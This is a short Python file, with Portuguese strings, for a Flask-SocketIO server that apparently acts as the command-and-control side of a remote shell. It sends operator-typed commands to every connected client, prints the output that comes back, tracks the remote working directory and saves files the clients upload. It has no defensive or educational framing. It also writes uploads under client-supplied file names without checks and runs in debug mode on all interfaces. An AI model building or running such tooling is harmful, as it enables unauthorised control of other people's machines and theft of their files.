from flask import Flask
from flask_socketio import SocketIO, emit
import threading
import os

app = Flask(__name__)
socketio = SocketIO(app)

current_directory = ""

@app.route('/')
def index():
    return "Servidor Flask com WebSocket!"

@socketio.on('connect')
def handle_connect():
    print("Cliente conectado!")
    emit('response', {'data': 'Você está conectado!'})

def command_sender():
    global current_directory
    while True:
        command = input(f"{current_directory} > ")  
        socketio.emit('execute_command', command)  

@socketio.on('command_response')
def handle_command_response(data):
    print(data['output'])

@socketio.on('directory_update')
def handle_directory_update(data):
    global current_directory
    current_directory = data['directory']
    print(f"{current_directory}")

@socketio.on('file_upload')
def handle_file_upload(data):
    file_name = data['file_name']
    file_data = data['file_data']
    file_path = os.path.join(current_directory, file_name)
    
    with open(file_path, 'wb') as f:
        f.write(file_data)
    emit('response', {'data': f"Arquivo '{file_name}' recebido com sucesso."})

if __name__ == '__main__':
    threading.Thread(target=command_sender, daemon=True).start()
    socketio.run(app, host='0.0.0.0', port=5000, debug=True)
